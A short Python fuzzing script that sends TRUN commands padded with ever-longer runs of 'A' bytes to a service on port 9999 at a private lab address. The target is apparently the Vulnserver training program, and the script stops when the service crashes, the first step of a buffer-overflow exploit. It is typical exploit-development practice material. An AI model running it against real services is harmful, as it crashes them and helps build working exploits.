#!/usr/bin/python3
import socket
import sys
from time import sleep

RHOST = '192.168.17.1'
RPORT = 9999

size = 100

buffer = b"A" * size

while True:
    try:
        payload = b"TRUN /.:/" + buffer

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((RHOST,RPORT))
        print("[+] Sending the payload...\n" + str(len(buffer)))
        s.send((payload))
        s.close()
        sleep(1)
        buffer = buffer + (b"A" * size)
    except:
        print("The fuzzing crashed at %s bytes" %str(len(buffer)))
        sys.exit()

